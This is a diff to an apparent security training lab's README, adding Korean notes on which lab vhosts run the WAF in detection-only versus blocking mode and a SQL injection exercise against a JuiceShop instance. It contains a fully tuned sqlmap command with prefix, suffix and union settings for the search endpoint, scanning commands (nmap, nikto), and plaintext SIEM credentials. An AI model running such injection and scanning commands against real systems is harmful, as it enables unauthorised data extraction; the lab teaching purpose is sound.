@@ -23,11 +23,20 @@ Network topology (4-tier chained):
 All HTTP attacks traverse: attacker -> fw -> ips -> web -> vuln
 Internal services (siem, dashboard, portal): -> fw -> ips -> [target]
 
+WAF 정책 (vhost 별로 다름 — 대조 실습용):
+  juice.el34.lab / ai.el34.lab  = DetectionOnly (탐지만, 공격 성공함)
+  dvwa.el34.lab  등 나머지      = On (차단, 403 반환)
+
 Quick start:
   curl http://juice.el34.lab/                    (vuln, via WAF)
-  curl -A 'sqlmap/1.7' http://juice.el34.lab/    (WAF blocks, IDS alerts)
+  curl -A 'sqlmap/1.7' http://dvwa.el34.lab/     (WAF blocks 403, IDS alerts)
   nmap -sT -p 80,443 10.20.32.80                (web direct, via fw+ips)
   nikto -h http://juice.el34.lab/
+
+SQLi 실습 — JuiceShop 검색은 LIKE '%q%' 안에 들어가므로 sqlmap 기본값은
+실패한다(구문오류 → JuiceShop 이 500 반환. WAF 차단이 아님). prefix/suffix 필수:
+  sqlmap -u "http://juice.el34.lab/rest/products/search?q=apple" -p q \
+    --dbms=sqlite --technique=U --union-cols=9 --prefix="'))" --suffix="--" --batch
 
 Browse SIEM (no WAF in path):
   https://siem.el34.lab/   (admin / SecretPassword)
